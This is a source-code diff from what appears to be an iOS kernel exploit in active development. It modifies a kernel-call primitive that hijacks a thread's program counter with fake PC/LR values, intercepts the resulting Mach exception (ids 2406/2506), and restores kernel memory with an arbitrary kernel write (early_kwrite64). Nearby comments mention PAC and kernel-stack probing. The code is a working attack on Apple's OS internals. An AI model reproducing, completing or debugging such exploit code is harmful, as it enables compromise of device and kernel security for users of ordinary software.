@@ -2479,13 +2479,19 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         st.__opaque_pc = (void *)(uintptr_t)0x301;
                                         st.__opaque_lr = (void *)(uintptr_t)0x401;
                                         kern_return_t ssr = thread_set_state(hp, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
-                                        { NSString *s = [NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x resume\n", ssr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
+                                        { NSString *s = [NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x — resume\n", ssr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
                                         thread_resume(hp);
-                                        // Request: 2406, до 0x40+68*4 = 0x150 байт достаточно
+                                        // 2.0.132: минимальный recv, 200ms timeout
                                         uint8_t req[0x200]; memset(req, 0, sizeof(req));
                                         mach_msg_header_t *rh = (mach_msg_header_t *)req;
-                                        kern_return_t wkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x200, excport, 500, MACH_PORT_NULL);
+                                        kern_return_t wkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x200, excport, 200, MACH_PORT_NULL);
                                         { NSString *s = [NSString stringWithFormat:@"recv kr=0x%x id=%u size=%u\n", wkr, rh->msgh_id, rh->msgh_size]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
+                                        // сразу terminate, БЕЗ suspend/get_state
+                                        thread_terminate(hp);
+                                        mach_port_deallocate(mach_task_self(), excport);
+                                        early_kwrite64(oVA, o0);
+                                        { NSString *s = [NSString stringWithFormat:@"DONE — no suspend/get_state\n"]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
+                                        goto kcall_end;
                                         if (wkr == KERN_SUCCESS && rh->msgh_id == 2406) {
                                             // Reply 2506
                                             uint8_t rep[0x200]; memset(rep, 0, sizeof(rep));
@@ -2516,13 +2522,10 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         } else {
                                             kpNote(r, @"  [KCALL] не raise_state (id!=2406) — пропуск");
                                         }
-                                        early_kwrite64(oVA, o0);
-                                        thread_terminate(hp);
-                                        mach_port_deallocate(mach_task_self(), excport);
                                         }
                                     }
                                 }
-                            }
+                            kcall_end: ;
                                                     }
                         // 2.0.97: дамп thread* 0x00..0x200 — ищем kstack/PAC по контенту
                         NSMutableString *tdd = [NSMutableString string];
